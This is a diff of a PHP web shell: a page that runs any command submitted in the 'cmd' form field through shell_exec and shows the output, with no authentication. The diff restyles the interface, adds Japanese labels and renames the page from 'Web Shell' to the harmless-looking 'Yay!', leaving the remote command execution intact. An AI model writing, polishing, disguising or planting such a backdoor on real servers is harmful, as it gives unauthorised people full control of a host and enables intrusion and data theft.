@@ -1,107 +1,180 @@
 <?php
-if (!empty($_POST['cmd'])) {
-    $cmd = shell_exec($_POST['cmd']);
+if (!empty($_POST["cmd"])) {
+  $cmd = shell_exec($_POST["cmd"]);
 }
 ?>
+
 <!DOCTYPE html>
 <html lang="en">
-<head>
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Web Shell</title>
+  <head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      rel="stylesheet"
+      href="https://fonts.googleapis.com/css2?family=Noto+Sans+JP:wght@300;400&display=swap"
+    />
+    <title>Yay!</title>
     <style>
-        * {
-            -webkit-box-sizing: border-box;
-            box-sizing: border-box;
-        }
+      :root {
+        --bg--clr: #fed9b7;
+        --focus--clr: #e76f51;
+        --main--clr: #faca9d;
+        --text--clr: #2b2e44;
+        --input--clr: #f4f1de;
+        --selection--clr: #f4f1de;
+        --selection-focus--clr: #161722;
+        --scrollbar-clr: #2b1d1d;
+      }
 
-        body {
-            font-family: sans-serif;
-            color: rgba(0, 0, 0, .75);
-        }
+      * {
+        -webkit-box-sizing: border-box;
+        box-sizing: border-box;
+        color: var(--text--clr);
+        font-weight: 100;
+        scrollbar-color: var(--scrollbar-clr) transparent;
+      }
 
-        main {
-            margin: auto;
-            max-width: 850px;
-        }
+      *::-webkit-scrollbar-thumb {
+        background: var(--scrollbar-clr);
+      }
 
-        pre,
-        input,
-        button {
-            border-radius: 5px;
-        }
+      *::-webkit-scrollbar-corner {
+        display: none;
+      }
 
-        pre,
-        input,
-        button {
-            background-color: #efefef;
-        }
+      *::-webkit-scrollbar {
+        width: 6px;
+        height: 6px;
+      }
 
-        label {
-            display: block;
-        }
+      .shell {
+        font-family: "Noto Sans JP", sans-serif;
+        background-color: var(--bg--clr);
+      }
 
-        input {
-            width: 100%;
-            background-color: #efefef;
-            border: 2px solid transparent;
-        }
+      .main {
+        margin: auto;
+        background-color: var(--bg--clr);
+        width: 100%;
+        height: 100%;
+        display: flex;
+        place-items: center;
+        flex-direction: column;
+      }
 
-        input:focus {
-            outline: none;
-            background: transparent;
-            border: 2px solid #e6e6e6;
-        }
+      .ipt {
+        all: unset;
+        width: 100%;
+        height: 20%;
+        border: none;
+        outline: none;
+        font-size: 15px;
+        font-weight: 400;
+      }
 
-        button {
-            border: none;
-            cursor: pointer;
-            margin-left: 5px;
-        }
+      .btn {
+        all: unset;
+        border: none;
+        cursor: pointer;
+        margin-left: 5px;
+        outline: none;
+      }
 
-        button:hover {
-            background-color: #e6e6e6;
-        }
+      .result,
+      .ipt,
+      .btn,
+      .no-result {
+        background-color: var(--main--clr);
+        transition: 100ms;
+        padding: 10px;
+      }
 
-        pre,
-        input,
-        button {
-            padding: 10px;
-        }
+      .result {
+        width: 80%;
+        overflow: scroll;
+      }
 
-        .form-group {
-            display: -webkit-box;
-            display: -ms-flexbox;
-            display: flex;
-            padding: 15px 0;
-        }
+      .no-result {
+        width: 20%;
+        text-align: center;
+        font-weight: 400;
+      }
+
+      .form {
+        height: 100%;
+        width: 80%;
+      }
+
+      .form-group {
+        display: flex;
+        padding: 15px 0;
+      }
+
+      .ipt::placeholder {
+        color: var(--text--clr);
+        opacity: 0.6;
+        font-weight: 300;
+      }
+
+      /* Events */
+
+      *::selection {
+        background: var(--selection--clr);
+      }
+
+      .ipt:focus::selection,
+      .btn:focus::selection,
+      .ipt:hover::selection {
+        background: var(--selection-focus--clr);
+      }
+
+      .btn:hover,
+      .ipt:hover,
+      .btn:focus,
+      .ipt:focus {
+        background-color: var(--focus--clr);
+        color: var(--input--clr);
+      }
+
+      .ipt:focus::placeholder,
+      .ipt:hover::placeholder {
+        color: var(--input--clr);
+        opacity: 0.8;
+      }
     </style>
+  </head>
 
-</head>
+  <body class="shell">
+    <main class="main">
+      <form method="post" class="form">
+        <div class="form-group">
+          <input
+            class="ipt"
+            type="text"
+            name="cmd"
+            id="cmd"
+            value="<?= htmlspecialchars($_POST['cmd'], ENT_QUOTES, 'UTF-8') ?>"
+            onfocus="this.setSelectionRange(this.value.length, this.value.length);"
+            autofocus
+            required
+            placeholder="指図"
+          />
+          <button type="submit" class="btn">exec</button>
+        </div>
+      </form>
 
-<body>
-    <main>
-        <h1>Web Shell</h1>
-        <h2>Execute a command</h2>
-
-        <form method="post">
-            <label for="cmd"><strong>Command</strong></label>
-            <div class="form-group">
-                <input type="text" name="cmd" id="cmd" value="<?= htmlspecialchars($_POST['cmd'], ENT_QUOTES, 'UTF-8') ?>"
-                       onfocus="this.setSelectionRange(this.value.length, this.value.length);" autofocus required>
-                <button type="submit">Execute</button>
-            </div>
-        </form>
-
-        <?php if ($_SERVER['REQUEST_METHOD'] === 'POST'): ?>
-            <h2>Output</h2>
-            <?php if (isset($cmd)): ?>
-                <pre><?= htmlspecialchars($cmd, ENT_QUOTES, 'UTF-8') ?></pre>
-            <?php else: ?>
-                <pre><small>No result.</small></pre>
-            <?php endif; ?>
-        <?php endif; ?>
+      <?php if ($_SERVER["REQUEST_METHOD"] === "POST"): ?>
+      <?php if (isset($cmd)): ?>
+      <pre
+        class="result"
+      ><?= htmlspecialchars($cmd, ENT_QUOTES, "UTF-8") ?></pre>
+      <?php else: ?>
+      <span class="no-result">なし。</span>
+      <?php endif; ?>
+      <?php endif; ?>
     </main>
-</body>
+  </body>
 </html>
